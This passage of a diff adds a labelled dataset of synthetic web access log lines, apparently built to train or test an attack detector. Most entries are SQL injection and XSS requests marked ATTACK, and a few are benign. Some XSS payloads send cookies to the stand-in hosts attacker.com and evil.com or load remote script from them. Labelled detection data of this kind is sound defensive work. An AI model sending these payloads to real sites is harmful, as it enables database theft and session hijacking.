+  {
+    "raw": "192.168.1.105 - - [01/Jun/2026:10:16:30 +0000] \"GET /checkout/shipping HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.106 - - [01/Jun/2026:10:16:32 +0000] \"GET /faq HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.107 - - [01/Jun/2026:10:16:34 +0000] \"GET /services HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.108 - - [01/Jun/2026:10:16:36 +0000] \"GET /pricing HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.109 - - [01/Jun/2026:10:16:38 +0000] \"GET /favicon.ico HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "45.33.32.10 - - [01/Jun/2026:10:20:00 +0000] \"GET /products?id=1%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.11 - - [01/Jun/2026:10:20:05 +0000] \"GET /search?q=admin%27%20OR%201=1-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.12 - - [01/Jun/2026:10:20:10 +0000] \"GET /items?cat=books%27%3B%20DROP%20TABLE%20users%3B-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.13 - - [01/Jun/2026:10:20:15 +0000] \"GET /account?user=test%27%20UNION%20SELECT%20null%2Ctable_name%20FROM%20information_schema.tables-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.14 - - [01/Jun/2026:10:20:20 +0000] \"GET /api/data?id=10%20OR%201=1 HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.15 - - [01/Jun/2026:10:20:25 +0000] \"GET /login?u=admin%27%20UNION%20SELECT%201%2C2%2C3-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.16 - - [01/Jun/2026:10:20:30 +0000] \"GET /profile?id=5%27%20WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.17 - - [01/Jun/2026:10:20:35 +0000] \"GET /search?term=UNION%20SELECT%20password%20FROM%20accounts HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.18 - - [01/Jun/2026:10:20:40 +0000] \"GET /query?val=1%27%20AND%201=1-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.19 - - [01/Jun/2026:10:20:45 +0000] \"GET /view?doc=99%20UNION%20SELECT%20id%2C%20credit_card%20FROM%20payments HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.10 - - [01/Jun/2026:10:20:50 +0000] \"GET /products?id=1%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.11 - - [01/Jun/2026:10:20:55 +0000] \"GET /search?q=admin%27%20OR%201=1-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.12 - - [01/Jun/2026:10:21:00 +0000] \"GET /items?cat=books%27%3B%20DROP%20TABLE%20users%3B-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.13 - - [01/Jun/2026:10:21:05 +0000] \"GET /account?user=test%27%20UNION%20SELECT%20null%2Ctable_name%20FROM%20information_schema.tables-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.14 - - [01/Jun/2026:10:21:10 +0000] \"GET /api/data?id=10%20OR%201=1 HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.15 - - [01/Jun/2026:10:21:15 +0000] \"GET /login?u=admin%27%20UNION%20SELECT%201%2C2%2C3-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.16 - - [01/Jun/2026:10:21:20 +0000] \"GET /profile?id=5%27%20WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.17 - - [01/Jun/2026:10:21:25 +0000] \"GET /search?term=UNION%20SELECT%20password%20FROM%20accounts HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.18 - - [01/Jun/2026:10:21:30 +0000] \"GET /query?val=1%27%20AND%201=1-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.19 - - [01/Jun/2026:10:21:35 +0000] \"GET /view?doc=99%20UNION%20SELECT%20id%2C%20credit_card%20FROM%20payments HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.10 - - [01/Jun/2026:10:21:40 +0000] \"GET /products?id=1%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.11 - - [01/Jun/2026:10:21:45 +0000] \"GET /search?q=admin%27%20OR%201=1-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.12 - - [01/Jun/2026:10:21:50 +0000] \"GET /items?cat=books%27%3B%20DROP%20TABLE%20users%3B-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.13 - - [01/Jun/2026:10:21:55 +0000] \"GET /account?user=test%27%20UNION%20SELECT%20null%2Ctable_name%20FROM%20information_schema.tables-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.14 - - [01/Jun/2026:10:22:00 +0000] \"GET /api/data?id=10%20OR%201=1 HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.15 - - [01/Jun/2026:10:22:05 +0000] \"GET /login?u=admin%27%20UNION%20SELECT%201%2C2%2C3-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.16 - - [01/Jun/2026:10:22:10 +0000] \"GET /profile?id=5%27%20WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.17 - - [01/Jun/2026:10:22:15 +0000] \"GET /search?term=UNION%20SELECT%20password%20FROM%20accounts HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.18 - - [01/Jun/2026:10:22:20 +0000] \"GET /query?val=1%27%20AND%201=1-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.19 - - [01/Jun/2026:10:22:25 +0000] \"GET /view?doc=99%20UNION%20SELECT%20id%2C%20credit_card%20FROM%20payments HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.10 - - [01/Jun/2026:10:22:30 +0000] \"GET /products?id=1%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.11 - - [01/Jun/2026:10:22:35 +0000] \"GET /search?q=admin%27%20OR%201=1-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.12 - - [01/Jun/2026:10:22:40 +0000] \"GET /items?cat=books%27%3B%20DROP%20TABLE%20users%3B-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.13 - - [01/Jun/2026:10:22:45 +0000] \"GET /account?user=test%27%20UNION%20SELECT%20null%2Ctable_name%20FROM%20information_schema.tables-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.14 - - [01/Jun/2026:10:22:50 +0000] \"GET /api/data?id=10%20OR%201=1 HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.15 - - [01/Jun/2026:10:22:55 +0000] \"GET /login?u=admin%27%20UNION%20SELECT%201%2C2%2C3-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.16 - - [01/Jun/2026:10:23:00 +0000] \"GET /profile?id=5%27%20WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.17 - - [01/Jun/2026:10:23:05 +0000] \"GET /search?term=UNION%20SELECT%20password%20FROM%20accounts HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.18 - - [01/Jun/2026:10:23:10 +0000] \"GET /query?val=1%27%20AND%201=1-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.19 - - [01/Jun/2026:10:23:15 +0000] \"GET /view?doc=99%20UNION%20SELECT%20id%2C%20credit_card%20FROM%20payments HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.10 - - [01/Jun/2026:10:23:20 +0000] \"GET /products?id=1%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.11 - - [01/Jun/2026:10:23:25 +0000] \"GET /search?q=admin%27%20OR%201=1-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.12 - - [01/Jun/2026:10:23:30 +0000] \"GET /items?cat=books%27%3B%20DROP%20TABLE%20users%3B-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.13 - - [01/Jun/2026:10:23:35 +0000] \"GET /account?user=test%27%20UNION%20SELECT%20null%2Ctable_name%20FROM%20information_schema.tables-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.14 - - [01/Jun/2026:10:23:40 +0000] \"GET /api/data?id=10%20OR%201=1 HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.15 - - [01/Jun/2026:10:23:45 +0000] \"GET /login?u=admin%27%20UNION%20SELECT%201%2C2%2C3-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.16 - - [01/Jun/2026:10:23:50 +0000] \"GET /profile?id=5%27%20WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.17 - - [01/Jun/2026:10:23:55 +0000] \"GET /search?term=UNION%20SELECT%20password%20FROM%20accounts HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.18 - - [01/Jun/2026:10:24:00 +0000] \"GET /query?val=1%27%20AND%201=1-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "45.33.32.19 - - [01/Jun/2026:10:24:05 +0000] \"GET /view?doc=99%20UNION%20SELECT%20id%2C%20credit_card%20FROM%20payments HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.7\"",
+    "label": "ATTACK",
+    "category": "sqli"
+  },
+  {
+    "raw": "185.220.101.5 - - [01/Jun/2026:10:30:00 +0000] \"GET /search?q=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.6 - - [01/Jun/2026:10:30:05 +0000] \"GET /comment?msg=%3Cimg%20src=x%20onerror=alert%28document.cookie%29%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.7 - - [01/Jun/2026:10:30:10 +0000] \"GET /profile?name=%3Csvg%20onload=fetch%28%27http://attacker.com/?c=%27%2Bdocument.cookie%29%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.8 - - [01/Jun/2026:10:30:15 +0000] \"GET /view?ref=%3Ciframe%20src=%27javascript:alert%281%29%27%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.9 - - [01/Jun/2026:10:30:20 +0000] \"GET /search?keyword=%3Cbody%20onload=alert%28%27XSS%27%29%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.10 - - [01/Jun/2026:10:30:25 +0000] \"GET /feedback?text=%3Cscript%20src=http://evil.com/payload.js%3E%3C/script%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.11 - - [01/Jun/2026:10:30:30 +0000] \"GET /guestbook?msg=%3Cscript%3Edocument.location=%27http://evil.com?c=%27%2Bdocument.cookie%3B%3C/script%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.12 - - [01/Jun/2026:10:30:35 +0000] \"GET /test?p=%3Cinput%20onfocus=alert%281%29%20autofocus%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.13 - - [01/Jun/2026:10:30:40 +0000] \"GET /item?tag=%3Cdetails%20open%20ontoggle=alert%281%29%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.14 - - [01/Jun/2026:10:30:45 +0000] \"GET /forum?title=%3Ca%20href=%27javascript:alert%281%29%27%3Eclick%20me%3C/a%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.5 - - [01/Jun/2026:10:30:50 +0000] \"GET /search?q=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.6 - - [01/Jun/2026:10:30:55 +0000] \"GET /comment?msg=%3Cimg%20src=x%20onerror=alert%28document.cookie%29%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.7 - - [01/Jun/2026:10:31:00 +0000] \"GET /profile?name=%3Csvg%20onload=fetch%28%27http://attacker.com/?c=%27%2Bdocument.cookie%29%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.8 - - [01/Jun/2026:10:31:05 +0000] \"GET /view?ref=%3Ciframe%20src=%27javascript:alert%281%29%27%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.9 - - [01/Jun/2026:10:31:10 +0000] \"GET /search?keyword=%3Cbody%20onload=alert%28%27XSS%27%29%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.10 - - [01/Jun/2026:10:31:15 +0000] \"GET /feedback?text=%3Cscript%20src=http://evil.com/payload.js%3E%3C/script%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.11 - - [01/Jun/2026:10:31:20 +0000] \"GET /guestbook?msg=%3Cscript%3Edocument.location=%27http://evil.com?c=%27%2Bdocument.cookie%3B%3C/script%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.12 - - [01/Jun/2026:10:31:25 +0000] \"GET /test?p=%3Cinput%20onfocus=alert%281%29%20autofocus%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.13 - - [01/Jun/2026:10:31:30 +0000] \"GET /item?tag=%3Cdetails%20open%20ontoggle=alert%281%29%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.14 - - [01/Jun/2026:10:31:35 +0000] \"GET /forum?title=%3Ca%20href=%27javascript:alert%281%29%27%3Eclick%20me%3C/a%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.5 - - [01/Jun/2026:10:31:40 +0000] \"GET /search?q=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.6 - - [01/Jun/2026:10:31:45 +0000] \"GET /comment?msg=%3Cimg%20src=x%20onerror=alert%28document.cookie%29%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.7 - - [01/Jun/2026:10:31:50 +0000] \"GET /profile?name=%3Csvg%20onload=fetch%28%27http://attacker.com/?c=%27%2Bdocument.cookie%29%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.8 - - [01/Jun/2026:10:31:55 +0000] \"GET /view?ref=%3Ciframe%20src=%27javascript:alert%281%29%27%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.9 - - [01/Jun/2026:10:32:00 +0000] \"GET /search?keyword=%3Cbody%20onload=alert%28%27XSS%27%29%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.10 - - [01/Jun/2026:10:32:05 +0000] \"GET /feedback?text=%3Cscript%20src=http://evil.com/payload.js%3E%3C/script%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.11 - - [01/Jun/2026:10:32:10 +0000] \"GET /guestbook?msg=%3Cscript%3Edocument.location=%27http://evil.com?c=%27%2Bdocument.cookie%3B%3C/script%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.12 - - [01/Jun/2026:10:32:15 +0000] \"GET /test?p=%3Cinput%20onfocus=alert%281%29%20autofocus%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.13 - - [01/Jun/2026:10:32:20 +0000] \"GET /item?tag=%3Cdetails%20open%20ontoggle=alert%281%29%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.14 - - [01/Jun/2026:10:32:25 +0000] \"GET /forum?title=%3Ca%20href=%27javascript:alert%281%29%27%3Eclick%20me%3C/a%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.5 - - [01/Jun/2026:10:32:30 +0000] \"GET /search?q=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.6 - - [01/Jun/2026:10:32:35 +0000] \"GET /comment?msg=%3Cimg%20src=x%20onerror=alert%28document.cookie%29%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.7 - - [01/Jun/2026:10:32:40 +0000] \"GET /profile?name=%3Csvg%20onload=fetch%28%27http://attacker.com/?c=%27%2Bdocument.cookie%29%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.8 - - [01/Jun/2026:10:32:45 +0000] \"GET /view?ref=%3Ciframe%20src=%27javascript:alert%281%29%27%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.9 - - [01/Jun/2026:10:32:50 +0000] \"GET /search?keyword=%3Cbody%20onload=alert%28%27XSS%27%29%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.10 - - [01/Jun/2026:10:32:55 +0000] \"GET /feedback?text=%3Cscript%20src=http://evil.com/payload.js%3E%3C/script%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.11 - - [01/Jun/2026:10:33:00 +0000] \"GET /guestbook?msg=%3Cscript%3Edocument.location=%27http://evil.com?c=%27%2Bdocument.cookie%3B%3C/script%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.12 - - [01/Jun/2026:10:33:05 +0000] \"GET /test?p=%3Cinput%20onfocus=alert%281%29%20autofocus%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.13 - - [01/Jun/2026:10:33:10 +0000] \"GET /item?tag=%3Cdetails%20open%20ontoggle=alert%281%29%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.14 - - [01/Jun/2026:10:33:15 +0000] \"GET /forum?title=%3Ca%20href=%27javascript:alert%281%29%27%3Eclick%20me%3C/a%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.5 - - [01/Jun/2026:10:33:20 +0000] \"GET /search?q=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.6 - - [01/Jun/2026:10:33:25 +0000] \"GET /comment?msg=%3Cimg%20src=x%20onerror=alert%28document.cookie%29%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.7 - - [01/Jun/2026:10:33:30 +0000] \"GET /profile?name=%3Csvg%20onload=fetch%28%27http://attacker.com/?c=%27%2Bdocument.cookie%29%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.8 - - [01/Jun/2026:10:33:35 +0000] \"GET /view?ref=%3Ciframe%20src=%27javascript:alert%281%29%27%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.9 - - [01/Jun/2026:10:33:40 +0000] \"GET /search?keyword=%3Cbody%20onload=alert%28%27XSS%27%29%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.10 - - [01/Jun/2026:10:33:45 +0000] \"GET /feedback?text=%3Cscript%20src=http://evil.com/payload.js%3E%3C/script%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.11 - - [01/Jun/2026:10:33:50 +0000] \"GET /guestbook?msg=%3Cscript%3Edocument.location=%27http://evil.com?c=%27%2Bdocument.cookie%3B%3C/script%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.12 - - [01/Jun/2026:10:33:55 +0000] \"GET /test?p=%3Cinput%20onfocus=alert%281%29%20autofocus%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.13 - - [01/Jun/2026:10:34:00 +0000] \"GET /item?tag=%3Cdetails%20open%20ontoggle=alert%281%29%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
+    "raw": "185.220.101.14 - - [01/Jun/2026:10:34:05 +0000] \"GET /forum?title=%3Ca%20href=%27javascript:alert%281%29%27%3Eclick%20me%3C/a%3E HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+    "label": "ATTACK",
+    "category": "xss"
+  },
+  {
